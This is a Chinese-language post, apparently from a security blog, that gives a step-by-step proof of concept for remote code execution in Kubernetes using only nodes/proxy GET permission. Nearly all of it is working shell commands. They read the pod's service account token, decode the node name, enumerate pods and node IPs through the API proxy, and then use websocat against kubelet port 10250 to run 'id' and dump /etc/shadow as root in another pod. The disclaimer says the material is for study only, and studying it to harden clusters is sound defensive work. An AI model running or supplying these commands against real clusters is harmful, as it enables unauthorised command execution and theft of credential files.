#  Kubernetes RCE：利用 nodes/proxy GET 请求漏洞  
ZM
                    ZM  暗镜   2026-01-31 04:00  
  
#   
  
这是一个POC验证Kubernetes RCE仅供学习，不得用于其他用途  
  
本实验演示了nodes/proxy GET权限如何允许在任何 Pod 中执行命令，即使该 Pod 看起来是只读的。  
## 进入目标POD  
  
首先，进入目标 pod。该 pod 有一个仅具有相应nodes/proxy GET权限的服务帐户。  
```
kubectl exec -it attacker -- sh
```  
  
复制到剪贴板  
## 检查您的权限  
  
确认服务帐户仅包含nodes/proxy GET：  
```
kubectl auth can-i --list
```  
  
复制到剪贴板  
  
你应该nodes/proxy只看到get动词部分——无需create许可。  
## 设置环境变量  
  
在攻击者 pod 内部，设置令牌和 API 服务器：  
```
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)export APISERVER=https://kubernetes.default.svc
```  
  
复制到剪贴板  
  
从 JWT 令牌有效负载中提取节点名称（JWT 使用 base64url 编码）：  
```
export NODE_NAME=$(echo "$(echo $TOKEN | cut -d. -f2)==" | tr '_-' '/+' | base64 -d 2>/dev/null | jq -r '.["kubernetes.io"].node.name')echo $NODE_NAME
```  
  
复制到剪贴板  
## 发现 Pod 和节点 IP  
  
仅使用nodes/proxy GET，查询 API 服务器代理端点，列出节点上的所有 pod 并发现它们的主机 IP：  
```
wget -qO- --no-check-certificate \  --header "Authorization: Bearer $TOKEN" \  "$APISERVER/api/v1/nodes/$NODE_NAME/proxy/pods" | jq -r '.items[] | "Node: \(.spec.nodeName) (\(.status.hostIP)), Namespace: \(.metadata.namespace), Pod: \(.metadata.name)"'
```  
  
复制到剪贴板  
  
提取节点 IP 地址以备后用：  
```
export NODE_IP=$(wget -qO- --no-check-certificate \  --header "Authorization: Bearer $TOKEN" \  "$APISERVER/api/v1/nodes/$NODE_NAME/proxy/pods" | jq -r '.items[0].status.hostIP')echo $NODE_IP
```  
  
复制到剪贴板  
## 在任何 Pod 中执行命令  
  
现在可以使用 websocat 在 nginx pod 中执行命令。之所以可行，是因为 WebSocket 连接使用 HTTP GET 进行握手，从而绕过了 CREATE 谓词检查：  
```
websocat --insecure \  --header "Authorization: Bearer $TOKEN" \  --protocol v4.channel.k8s.io \  "wss://$NODE_IP:10250/exec/default/nginx/nginx?output=1&error=1&command=id"
```  
  
复制到剪贴板  
  
你应该看到类似这样的输出uid=0(root) gid=0(root) groups=0(root)——证明仅使用 GET 权限执行命令。  
```
websocat --insecure \  --header "Authorization: Bearer $TOKEN" \  --protocol v4.channel.k8s.io \  "wss://$NODE_IP:10250/exec/default/nginx/nginx?output=1&error=1&command=cat&command=/etc/shadow"
```  
  
复制到剪贴板  
  
/etc/shadow读取nginx主机上的内容。  
  
  
